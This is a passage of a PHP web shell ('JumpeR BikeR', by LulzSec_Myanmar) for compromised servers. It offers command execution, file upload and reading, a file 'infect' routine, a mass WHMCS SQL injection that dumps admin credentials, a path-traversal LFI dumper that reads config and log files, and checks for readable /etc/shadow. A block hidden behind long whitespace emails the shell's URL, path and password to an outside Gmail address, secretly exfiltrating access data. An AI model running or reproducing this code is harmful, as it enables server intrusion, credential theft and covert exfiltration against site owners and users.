        .'<td><input type=text name=server value="127.0.0.1"></td></tr>'
        .'<tr><td><span>Brute type</span></td>'
        .'<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>'
        .'<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>'
        .'<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>'
        .'<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>'
        .'<td><input type=text name=login value="LulzSec"></td></tr>'
        .'<tr><td><span>Dictionary</span></td>'
        .'<td><input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"></td></tr></table>'
        .'</td></tr><tr><td></td><td><input type=submit value="Do it Lulz"></td></tr></form></table>';
    echo '</div><br>';
    printFooter();
}

                                                            
function actionInfect() {
                printHeader();
                echo '<h1>Infect</h1><div class=content>';
                if ($_POST['p1'] == 'infect') {
                    $target = $_SERVER['DOCUMENT_ROOT'];
                    function ListFiles($dir) {
                        if ($dh = opendir($dir)) {
                            $files = Array();
                            $inner_files = Array();
                            while ($file = readdir($dh)) {
                                if ($file != "." && $file != "..") {
                                    if (is_dir($dir . "/" . $file)) {
                                        $inner_files = ListFiles($dir . "/" . $file);
                                        if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                                    } else {
                                        array_push($files, $dir . "/" . $file);
                                    }
                                }
                            }
                            closedir($dh);
                            return $files;
                        }
                    }
                    foreach (ListFiles($target) as $key => $file) {
                        $nFile = substr($file, -4, 4);
                        if ($nFile == ".php") {
                            if (($file <> $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF']) && (is_writeable($file))) {
                                echo "$file<br>";
                                $i++;
                            }
                        }
                    }
                    echo "<font color=red size=14>$i</font>";
                } else {
                    echo "<form method=post><input type=submit value=Infect name=infet></form>";
                    echo 'Really want to Infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
                }
                printFooter();
            }
                            


function printFooter() {
    $is_writable = is_writable($GLOBALS['cwd'])?"<font color=lime>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
echo '</div><div style="margin:1px;background:#000;"><div class="content" style="border-top:1px  #56A3E9;">
<table class="info" id="toolsTbl" cellpadding="3" cellspacing="0" width="100%">
    <tr>
        <td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"><input type=submit value="Submit"></form></td>
        <td><form onsubmit="g(\'FilesTools\',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value="Submit"></form></td>
    </tr>
    <tr>
        <td><form onsubmit="g(\'FilesMan\',null,\'mkdir\',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value="Submit"></form>'.$is_writable.'</td>
        <td><form onsubmit="g(\'FilesTools\',null,this.f.value,\'mkfile\');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value="Submit"></form>'.$is_writable.'</td>
    </tr>
    <tr>
        <td><form onsubmit="g(\'Console\',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value="Submit"></form></td>
        <td><form method="post" ENCTYPE="multipart/form-data">
        <input type=hidden name=a value="FilesMAn">
        <input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'">
        <input type=hidden name=p1 value="uploadFile">
        <input type=hidden name=charset value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
        <span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value="Submit"></form>'.$is_writable.'</td>
    </tr>
</table></div></div>
<div style="margin:5px;background:#000;"><div class="content" style="border-top:1px  #56A3E9;text-align:center;font-weight:bold;"><font color="#2052ff">JumpeR BikeR '.VERSION.'<br>WE ARE: <marquee width="50%"> LulzSec_Myanmar </marquee></font></div></div>
</div>
</body></html>';
}
if ( !function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false) ) { function posix_getpwuid($p) { return false; } }
if ( !function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false) ) { function posix_getgrgid($p) { return false; } }

if(!isset($_SESSION['trimite'])){
    $url=" IP: ".gethostbyname($_SERVER["HTTP_HOST"]);
                                                                                                                                                                                                                                                                     $to="aung.khant2093@gmail.com";
$subject = "Hello Buddy";
$header = "from: New Kid";
$message = " link : http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."\r\n";
"User IP: ".$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
$message.="Path :"._file_;
$message.="Pass :".$auth_pass;
$sentmail = @mail($to,$subject,$message,$header);


    
}
function viewSize($s) {
    if($s >= 1073741824)
        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
    elseif($s >= 1048576)
        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
    elseif($s >= 1024)
        return sprintf('%1.2f', $s / 1024 ) . ' KB';
    else
        return $s . ' B';
}
function perms($p) {
    if (($p & 0xC000) == 0xC000)$i = 's';
    elseif (($p & 0xA000) == 0xA000)$i = 'l';
    elseif (($p & 0x8000) == 0x8000)$i = '-';
    elseif (($p & 0x6000) == 0x6000)$i = 'b';
    elseif (($p & 0x4000) == 0x4000)$i = 'd';
    elseif (($p & 0x2000) == 0x2000)$i = 'c';
    elseif (($p & 0x1000) == 0x1000)$i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}
function viewPermsColor($f) { 
    if (!@is_readable($f))
        return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
    elseif (!@is_writable($f))
        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
    else
        return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}
if(!function_exists("scandir")) {
    function scandir($dir) {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh))) {
            $files[] = $filename;
        }
        return $files;
    }
}
//shive function will b here //start

function actionshiv()// oops he have given there shiv now here it was shive so err
{
printHeader();  


echo '<body bgcolor=black>
<center><font color=orange>
<h1>Mass SQLi WHMCS</h1>
<form method=post>
<textarea name=sites rows=10 cols=50 placeholder="http://www.cybernamix.com.au"></textarea><br><br>
<input type=submit></form><hr>';

if(isset($_POST['sites'])){

 $exp=explode("\r\n",$_POST['sites']);
 foreach($exp as $url){

$site = $url."/viewticket.php";

$post = "tid[sqltype]=TABLEJOIN&tid[value]=-1 union select 1,0,0,0,0,0,0,0,0,0,0,concat(0x3c2f7469746c653e7665727361696c6c6573,(select(@x)from(select(@x:=0x00),(select(0)from(tbladmins)where(@x:=concat(@x,0x0d0a,username,0x207c20,password))))x),0x3c62723e736563376f727465616d),0,0,0,0,0,0,0,0,0,0,0#";


$ch = curl_init();
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
curl_setopt($ch, CURLOPT_URL, $site); 
curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
$exec = curl_exec($ch); 
curl_close($ch); 

if(eregi('versailles',$exec)){

echo "<font color=orange> [+] ".$url."</font><font color=lime> [INJECTED] </font><br>";
echo "<font color=lime>";
echo ikkeh($exec,"versailles","sec7orteam");

echo "</font><hr>";

flush();
ob_flush();

}else{
echo "<font color=red>[-] ".$url." [NOT VULNERABLE]</font><br><hr>";
}

}
}

function ikkeh($txt,$awal,$akhir) {
$pos1 = stripos($txt,$awal)+strlen($awal);
$pos2 = stripos($txt,$akhir,$pos1+1);
return substr($txt,$pos1,$pos2-$pos1);
};



printFooter();
}

//end




function actionSecInfo() {
    printHeader();
    echo ' <span style="color:White;font-family:Iceland;text-shadow:red 0px 0px 10px" "font-size: 50pt;"> <h1>Server security information By LulzSec_MM </h1><h1> LulzSec_Myanmar </h1><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v.'<br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br>';
    if( $GLOBALS['os'] == 'nix' ) {
        $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
        $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
        showSecParam('OS version', @file_get_contents('/proc/version'));
        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        if(!$GLOBALS['safe_mode']) {
            echo '<br>';
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            showSecParam('Downloaders', implode(', ',$temp));
            echo '<br/>';
            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
            showSecParam('HDD space', ex('df -h'));
            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        showSecParam('OS Version',ex('ver')); 
        showSecParam('Account Settings',ex('net accounts')); 
        showSecParam('User Accounts',ex('net user'));
    }
    echo '</div>';
    printFooter();
}

function actionlfiscan() {
        printHeader();
        print '
       <h3>LFI File dumper By LulzSec_MM</h3>
     
       <form method="post" action="?"><input type="hidden" name="a" value="lfiscan">
          LFI URL: <input type="text" size="60" name="lfiurl" value=""> <input type="submit" value="Go"> File: <select name="scantype">
             <option value="1">
                Access Log
             </option>
     
             <option value="2">
                httpd.conf
             </option>
     
             <option value="3">
                Error Log
             </option>
             <option value="4">
                php.ini
             </option>
             <option value="5">
                MySQL
             </option>
             <option value="6">
                FTP
             </option>
             <option value="7">
                Environ
             </option>
          </select> Null: <select name="null">
             <option value="%00">
                Yes
             <option value="">
                No
             </option>
          </select> User-Agent: <input type="text" size="20" name="custom_header" value="">
       </form>';
       error_reporting(0);
          if($_POST['lfiurl']) {
             print "<pre>";
             $cheader = $_POST['custom_header'];
             $target = $_POST['lfiurl'];
             $type = $_POST['scantype'];
             $byte1 = $_POST['null'];
             $lfitest = "../../../../../../../../../../../../../../etc/passwd".$byte1."";
             $lfitest2 = "../../../../../../../../../../../../../../fake/file".$byte1."";
             $lfiprocenv = "../../../../../../../../../../../../../../proc/environ".$byte1."";
             $lfiaccess = array(
                1 => "../../../../../../../../../../../../../../apache/logs/access.log".$byte1."",
                2 => "../../../../../../../../../../../../../../etc/httpd/logs/acces_log".$byte1."",
                3 => "../../../../../../../../../../../../../../etc/httpd/logs/acces.log".$byte1."",
                4 => "../../../../../../../../../../../../../../var/www/logs/access_log".$byte1."",
                5 => "../../../../../../../../../../../../../../var/www/logs/access.log".$byte1."",
                6 => "../../../../../../../../../../../../../../usr/local/apache/logs/access_log".$byte1."",
                7 => "../../../../../../../../../../../../../../usr/local/apache/logs/access.log".$byte1."",
                8 => "../../../../../../../../../../../../../../var/log/apache/access_log".$byte1."",
                9 => "../../../../../../../../../../../../../../var/log/apache2/access_log".$byte1."",
                10 => "../../../../../../../../../../../../../../var/log/apache/access.log".$byte1."",
                11 => "../../../../../../../../../../../../../../var/log/apache2/access.log".$byte1."",
                12 => "../../../../../../../../../../../../../../var/log/access_log".$byte1."",
                13 => "../../../../../../../../../../../../../../var/log/access.log".$byte1."",
                14 => "../../../../../../../../../../../../../../var/log/httpd/access_log".$byte1."",
                15 => "../../../../../../../../../../../../../../apache2/logs/access.log".$byte1."",
                16 => "../../../../../../../../../../../../../../logs/access.log".$byte1."",
                17 => "../../../../../../../../../../../../../../usr/local/apache2/logs/access_log".$byte1."",
                18 => "../../../../../../../../../../../../../../usr/local/apache2/logs/access.log".$byte1."",
                19 => "../../../../../../../../../../../../../../var/log/httpd/access.log".$byte1."",
                20 => "../../../../../../../../../../../../../../opt/lampp/logs/access_log".$byte1."",
                21 => "../../../../../../../../../../../../../../opt/xampp/logs/access_log".$byte1."",
                22 => "../../../../../../../../../../../../../../opt/lampp/logs/access.log".$byte1."",
                23 => "../../../../../../../../../../../../../../opt/xampp/logs/access.log".$byte1."");
           
             $lfierror = array(
                1 => "../../../../../../../../../../../../../../apache/logs/error.log".$byte1."",
                2 => "../../../../../../../../../../../../../../etc/httpd/logs/error_log".$byte1."",
                3 => "../../../../../../../../../../../../../../etc/httpd/logs/error.log".$byte1."",
                4 => "../../../../../../../../../../../../../../var/www/logs/error_log".$byte1."",
                5 => "../../../../../../../../../../../../../../var/www/logs/error.log".$byte1."",
                6 => "../../../../../../../../../../../../../../usr/local/apache/logs/error_log".$byte1."",
                7 => "../../../../../../../../../../../../../../usr/local/apache/logs/error.log".$byte1."",
                8 => "../../../../../../../../../../../../../../var/log/apache/error_log".$byte1."",
                9 => "../../../../../../../../../../../../../../var/log/apache2/error_log".$byte1."",
                10 => "../../../../../../../../../../../../../../var/log/apache/error.log".$byte1."",
                11 => "../../../../../../../../../../../../../../var/log/apache2/error.log".$byte1."",
                12 => "../../../../../../../../../../../../../../var/log/error_log".$byte1."",
                13 => "../../../../../../../../../../../../../../var/log/error.log".$byte1."",
                14 => "../../../../../../../../../../../../../../var/log/httpd/error_log".$byte1."",
                15 => "../../../../../../../../../../../../../../apache2/logs/error.log".$byte1."",
                16 => "../../../../../../../../../../../../../../logs/error.log".$byte1."",
                17 => "../../../../../../../../../../../../../../usr/local/apache2/logs/error_log".$byte1."",
                18 => "../../../../../../../../../../../../../../usr/local/apache2/logs/error.log".$byte1."",
                19 => "../../../../../../../../../../../../../../var/log/httpd/error.log".$byte1."",
                20 => "../../../../../../../../../../../../../../opt/lampp/logs/error_log".$byte1."",
                21 => "../../../../../../../../../../../../../../opt/xampp/logs/error_log".$byte1."",
                22 => "../../../../../../../../../../../../../../opt/lampp/logs/error.log".$byte1."",
                23 => "../../../../../../../../../../../../../../opt/xampp/logs/error.log".$byte1."");
     
             $lficonfig = array(
                1 => "../../../../../../../../../../../../../../../usr/local/apache/conf/httpd.conf".$byte1."",
                2 => "../../../../../../../../../../../../../../../usr/local/apache2/conf/httpd.conf".$byte1."",
                3 => "../../../../../../../../../../../../../../../etc/httpd/conf/httpd.conf".$byte1."",
                4 => "../../../../../../../../../../../../../../../etc/apache/conf/httpd.conf".$byte1."",
                5 => "../../../../../../../../../../../../../../../usr/local/etc/apache/conf/httpd.conf".$byte1."",
                6 => "../../../../../../../../../../../../../../../etc/apache2/httpd.conf".$byte1."",
                7 => "../../../../../../../../../../../../../../../usr/local/apache/httpd.conf".$byte1."",
                8 => "../../../../../../../../../../../../../../../usr/local/apache2/httpd.conf".$byte1."",
                9 => "../../../../../../../../../../../../../../../usr/local/httpd/conf/httpd.conf".$byte1."",
                10 => "../../../../../../../../../../../../../../../usr/local/etc/apache2/conf/httpd.conf".$byte1."",
                11 => "../../../../../../../../../../../../../../../usr/local/etc/httpd/conf/httpd.conf".$byte1."",
                12 => "../../../../../../../../../../../../../../../usr/apache2/conf/httpd.conf".$byte1."",
                13 => "../../../../../../../../../../../../../../../usr/apache/conf/httpd.conf".$byte1."",
                14 => "../../../../../../../../../../../../../../../usr/local/apps/apache2/conf/httpd.conf".$byte1."",
                15 => "../../../../../../../../../../../../../../../usr/local/apps/apache/conf/httpd.conf".$byte1."",
                16 => "../../../../../../../../../../../../../../../etc/apache2/conf/httpd.conf".$byte1."",
                17 => "../../../../../../../../../../../../../../../etc/http/conf/httpd.conf".$byte1."",
                18 => "../../../../../../../../../../../../../../../etc/httpd/httpd.conf".$byte1."",
                19 => "../../../../../../../../../../../../../../../etc/http/httpd.conf".$byte1."",
                20 => "../../../../../../../../../../../../../../../etc/httpd.conf".$byte1."",
                21 => "../../../../../../../../../../../../../../../opt/apache/conf/httpd.conf".$byte1."",
                22 => "../../../../../../../../../../../../../../../opt/apache2/conf/httpd.conf".$byte1."",
                23 => "../../../../../../../../../../../../../../../var/www/conf/httpd.conf".$byte1."",
                24 => "../../../../../../../../../../../../../../../private/etc/httpd/httpd.conf".$byte1."",
                25 => "../../../../../../../../../../../../../../../private/etc/httpd/httpd.conf.default".$byte1."",
                26 => "../../../../../../../../../../../../../../../Volumes/webBackup/opt/apache2/conf/httpd.conf".$byte1."",
                27 => "../../../../../../../../../../../../../../../Volumes/webBackup/private/etc/httpd/httpd.conf".$byte1."",
                28 => "../../../../../../../../../../../../../../../Volumes/webBackup/private/etc/httpd/httpd.conf.default".$byte1."",
                29 => "../../../../../../../../../../../../../../../usr/local/php/httpd.conf.php".$byte1."",
                30 => "../../../../../../../../../../../../../../../usr/local/php4/httpd.conf.php".$byte1."",
                31 => "../../../../../../../../../../../../../../../usr/local/php5/httpd.conf.php".$byte1."",
                32 => "../../../../../../../../../../../../../../../usr/local/php/httpd.conf".$byte1."",
                33 => "../../../../../../../../../../../../../../../usr/local/php4/httpd.conf".$byte1."",
                34 => "../../../../../../../../../../../../../../../usr/local/php5/httpd.conf".$byte1."",
                35 => "../../../../../../../../../../../../../../../usr/local/etc/apache/vhosts.conf".$byte1."");
                   
              $lfiphpini = array(
                1 => "../../../../../../../../../../../../../../../etc/php.ini".$byte1."",
                2 => "../../../../../../../../../../../../../../../bin/php.ini".$byte1."",
                3 => "../../../../../../../../../../../../../../../etc/httpd/php.ini".$byte1."",
                4 => "../../../../../../../../../../../../../../../usr/lib/php.ini".$byte1."",
                5 => "../../../../../../../../../../../../../../../usr/lib/php/php.ini".$byte1."",
                6 => "../../../../../../../../../../../../../../../usr/local/etc/php.ini".$byte1."",
                7 => "../../../../../../../../../../../../../../../usr/local/lib/php.ini".$byte1."",
                8 => "../../../../../../../../../../../../../../../usr/local/php/lib/php.ini".$byte1."",
                9 => "../../../../../../../../../../../../../../../usr/local/php4/lib/php.ini".$byte1."",
                10 => "../../../../../../../../../../../../../../../usr/local/php5/lib/php.ini".$byte1."",
                11 => "../../../../../../../../../../../../../../../usr/local/apache/conf/php.ini".$byte1."",
                12 => "../../../../../../../../../../../../../../../etc/php4.4/fcgi/php.ini".$byte1."",
                13 => "../../../../../../../../../../../../../../../etc/php4/apache/php.ini".$byte1."",
                14 => "../../../../../../../../../../../../../../../etc/php4/apache2/php.ini".$byte1."",
                15 => "../../../../../../../../../../../../../../../etc/php5/apache/php.ini".$byte1."",
                16 => "../../../../../../../../../../../../../../../etc/php5/apache2/php.ini".$byte1."",
                17 => "../../../../../../../../../../../../../../../etc/php/php.ini".$byte1."",
                18 => "../../../../../../../../../../../../../../../etc/php/php4/php.ini".$byte1."",
                19 => "../../../../../../../../../../../../../../../etc/php/apache/php.ini".$byte1."",
                20 => "../../../../../../../../../../../../../../../etc/php/apache2/php.ini".$byte1."",
                21 => "../../../../../../../../../../../../../../../web/conf/php.ini".$byte1."",
                22 => "../../../../../../../../../../../../../../../usr/local/Zend/etc/php.ini".$byte1."",
                23 => "../../../../../../../../../../../../../../../opt/xampp/etc/php.ini".$byte1."",
                24 => "../../../../../../../../../../../../../../../var/local/www/conf/php.ini".$byte1."",
                25 => "../../../../../../../../../../../../../../../etc/php/cgi/php.ini".$byte1."",
                26 => "../../../../../../../../../../../../../../../etc/php4/cgi/php.ini".$byte1."",
                27 => "../../../../../../../../../../../../../../../etc/php5/cgi/php.ini".$byte1."");
           
              $lfimysql = array(
                1 => "../../../../../../../../../../../../../../../var/log/mysql/mysql-bin.log".$byte1."",
                2 => "../../../../../../../../../../../../../../../var/log/mysql.log".$byte1."",
                3 => "../../../../../../../../../../../../../../../var/log/mysqlderror.log".$byte1."",
                4 => "../../../../../../../../../../../../../../../var/log/mysql/mysql.log".$byte1."",
                5 => "../../../../../../../../../../../../../../../var/log/mysql/mysql-slow.log".$byte1."",
                6 => "../../../../../../../../../../../../../../../var/mysql.log".$byte1."",
                7 => "../../../../../../../../../../../../../../../var/lib/mysql/my.cnf".$byte1."",
                8 => "../../../../../../../../../../../../../../../etc/mysql/my.cnf".$byte1."",
                9 => "../../../../../../../../../../../../../../../var/log/mysqld.log".$byte1."",
                10 => "../../../../../../../../../../../../../../../etc/my.cnf".$byte1."");
           
              $lfiftp = array(
                1 => "../../../../../../../../../../../../../../../etc/logrotate.d/proftpd".$byte1."",
                2 => "../../../../../../../../../../../../../../../www/logs/proftpd.system.log".$byte1."",
                3 => "../../../../../../../../../../../../../../../var/log/proftpd".$byte1."",
                4 => "../../../../../../../../../../../../../../../etc/proftp.conf".$byte1."",
                5 => "../../../../../../../../../../../../../../../etc/protpd/proftpd.conf".$byte1."",
                6 => "../../../../../../../../../../../../../../../etc/vhcs2/proftpd/proftpd.conf".$byte1."",
                7 => "../../../../../../../../../../../../../../../etc/proftpd/modules.conf".$byte1."",
                8 => "../../../../../../../../../../../../../../../var/log/vsftpd.log".$byte1."",
                9 => "../../../../../../../../../../../../../../../etc/vsftpd.chroot_list".$byte1."",
                10 => "../../../../../../../../../../../../../../../etc/logrotate.d/vsftpd.log".$byte1."",
                11 => "../../../../../../../../../../../../../../../etc/vsftpd/vsftpd.conf".$byte1."",
                12 => "../../../../../../../../../../../../../../../etc/vsftpd.conf".$byte1."",
                13 => "../../../../../../../../../../../../../../../etc/chrootUsers".$byte1."",
                14 => "../../../../../../../../../../../../../../../var/log/xferlog".$byte1."",
                15 => "../../../../../../../../../../../../../../../var/adm/log/xferlog".$byte1."",
                16 => "../../../../../../../../../../../../../../../etc/wu-ftpd/ftpaccess".$byte1."",
                17 => "../../../../../../../../../../../../../../../etc/wu-ftpd/ftphosts".$byte1."",
                18 => "../../../../../../../../../../../../../../../etc/wu-ftpd/ftpusers".$byte1."",
                19 => "../../../../../../../../../../../../../../../usr/sbin/pure-config.pl".$byte1."",
                20 => "../../../../../../../../../../../../../../../usr/etc/pure-ftpd.conf".$byte1."",
                21 => "../../../../../../../../../../../../../../../etc/pure-ftpd/pure-ftpd.conf".$byte1."",
                22 => "../../../../../../../../../../../../../../../usr/local/etc/pure-ftpd.conf".$byte1."",
                23 => "../../../../../../../../../../../../../../../usr/local/etc/pureftpd.pdb".$byte1."",
                24 => "../../../../../../../../../../../../../../../usr/local/pureftpd/etc/pureftpd.pdb".$byte1."",
                25 => "../../../../../../../../../../../../../../../usr/local/pureftpd/sbin/pure-config.pl".$byte1."",
                26 => "../../../../../../../../../../../../../../../usr/local/pureftpd/etc/pure-ftpd.conf".$byte1."",
                27 => "../../../../../../../../../../../../../../../etc/pure-ftpd.conf".$byte1."",
                28 => "../../../../../../../../../../../../../../../etc/pure-ftpd/pure-ftpd.pdb".$byte1."",
                29 => "../../../../../../../../../../../../../../../etc/pureftpd.pdb".$byte1."",
                30 => "../../../../../../../../../../../../../../../etc/pureftpd.passwd".$byte1."",
                31 => "../../../../../../../../../../../../../../../etc/pure-ftpd/pureftpd.pdb".$byte1."",
                32 => "../../../../../../../../../../../../../../../usr/ports/ftp/pure-ftpd/".$byte1."",
                33 => "../../../../../../../../../../../../../../../usr/ports/net/pure-ftpd/".$byte1."",
                34 => "../../../../../../../../../../../../../../../usr/pkgsrc/net/pureftpd/".$byte1."",
                35 => "../../../../../../../../../../../../../../../usr/ports/contrib/pure-ftpd/".$byte1."",
                36 => "../../../../../../../../../../../../../../../var/log/pure-ftpd/pure-ftpd.log".$byte1."",
                37 => "../../../../../../../../../../../../../../../logs/pure-ftpd.log".$byte1."",
                38 => "../../../../../../../../../../../../../../../var/log/pureftpd.log".$byte1."",
                39 => "../../../../../../../../../../../../../../../var/log/ftp-proxy/ftp-proxy.log".$byte1."",
                40 => "../../../../../../../../../../../../../../../var/log/ftp-proxy".$byte1."",
                41 => "../../../../../../../../../../../../../../../var/log/ftplog".$byte1."",
                42 => "../../../../../../../../../../../../../../../etc/logrotate.d/ftp".$byte1."",
                43 => "../../../../../../../../../../../../../../../etc/ftpchroot".$byte1."",
                44 => "../../../../../../../../../../../../../../../etc/ftphosts".$byte1."");
           
     
             $x = 1;
             if ( $type == 1 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lfiaccess[$x]) {
                    $res3 = FetchURL($target.$lfiaccess[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfiaccess[$x]."\">".$target."".$lfiaccess[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfiaccess[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
             if ( $type == 2 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lficonfig[$x]) {
                    $res3 = FetchURL($target.$lficonfig[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lficonfig[$x]."\">".$target."".$lficonfig[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lficonfig[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
             if ( $type == 3 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lfierror[$x]) {
                    $res3 = FetchURL($target.$lfierror[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfierror[$x]."\">".$target."".$lfierror[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfierror[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
             if ( $type == 4 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lfiphpini[$x]) {
                    $res3 = FetchURL($target.$lfiphpini[$x]);
                    $rhash3 = md5($res3);
                    if ($rhash3 != $rhash2) {
                    print "<font color='green'>[+] File detected!</font> <a href=\"".$target."".$lfiphpini[$x]."\">".$target."".$lfiphpini[$x]."</a><br  />";
                    }
                    else {            
                                  print "<font color='red'>[!] Failed!</font>".$target."".$lfiphpini[$x]."<br  />";
                    }
                    $x++;
          }
          }
             }
             if ( $type == 5 ) {
                $res1 = FetchURL($target.$lfitest);
                $res2 = FetchURL($target.$lfitest2);
                $rhash1 = md5($res1);
                $rhash2 = md5($res2);
                if ($rhash1 != $rhash2) {
                    print "<font color='green'>[+] Exploitable!</font> <a href=\"".$target."".$lfitest."\">".$target."".$lfitest."</a><br  />";
                while($lfimysql[$x]) {
